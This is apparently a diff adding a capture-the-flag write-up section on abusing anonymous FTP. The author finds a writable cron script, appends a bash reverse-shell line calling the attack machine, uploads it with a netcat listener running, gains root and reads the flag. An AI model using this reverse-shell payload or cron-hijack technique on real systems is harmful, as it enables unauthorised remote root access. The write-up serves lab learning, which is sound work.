@@ -632,3 +632,114 @@ Nmap done: 1 IP address (1 host up) scanned in 86.52 seconds
 ### What is the "HTTP-TITLE" for the webserver
 
 `http-title: TBFC&#39;s Internal Blog`
+
+## Day 9: Anyone can be Santa!
+
+*Category: Networking*
+*Tags: FTP*
+
+>Discover a common misconfiguration on file transfer servers, and understand how it may be abused.
+
+IP: `10.10.112.57`
+
+### Connecting to the FTP server and basic enumeration
+
+In a Linux Terminal, I used the `ftp` command and connected to the FTP server as `anonymous`.
+
+```
+ftp 10.10.112.57
+```
+
+Now that we are in, let's see what files we can find...
+
+```
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups
+drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops
+drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources
+drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public
+```
+
+`backups`, `elf_workshops` and `human_resources` appear to be empty. However, let's investigate `public` further.
+
+```
+ftp> cd public
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh
+-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
+226 Directory send OK.
+```
+
+Interesting, let's download these two files to examine them further...
+
+```
+ftp> get backup.sh
+local: backup.sh remote: backup.sh
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for backup.sh (341 bytes).
+226 Transfer complete.
+341 bytes received in 0.00 secs (481.9216 kB/s)
+ftp> get shoppinglist.txt
+local: shoppinglist.txt remote: shoppinglist.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).
+226 Transfer complete.
+24 bytes received in 0.00 secs (107.0206 kB/s)
+```
+
+Success!
+
+### shoppinglist.txt
+
+It turns out, `shoppinglist.txt` isn't all that interesting... All we learn is that Santa has `The Polar Express Movie` on his shopping list.
+
+### backup.sh
+
+`backup.sh`? More like `backdoor.sh`...  
+
+This bash shell script seams to be a cron job (something that runs automatically at a set time or time interval on a Linux system). Let's modify it to set up a reverse shell! First, I set up a netcat listener of port 4444 by running `nc -lvnp 4444`. Then, I added the following line to `backup.sh` before uploading it to the FTP server. (note: `10.6.23.34` is the IP of my attack machine)
+
+```sh
+# Added this line
+bash -i >& /dev/tcp/10.6.23.34/4444 0>&1
+```
+
+### Becoming root and getting the flag!
+
+First, I uploaded the `backup.sh` file with the payload from the previous section using FTP:
+
+```
+ftp> put backup.sh 
+local: backup.sh remote: backup.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+381 bytes sent in 0.00 secs (5.7675 MB/s)
+```
+
+Sure enough, I got the reverse shell within seconds:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.10.112.57 60270
+bash: cannot set terminal process group (1525): Inappropriate ioctl for device
+bash: no job control in this shell
+root@tbfc-ftp-01:~# whoami
+whoami
+root
+```
+
+Now, that we are root, we can read `/root/flag.txt` and get the flag!
+
+```
+root@tbfc-ftp-01:~# cat /root/flag.txt
+cat /root/flag.txt
+THM{even_you_can_be_santa}
+```
+
+Flag: `THM{even_you_can_be_santa}`
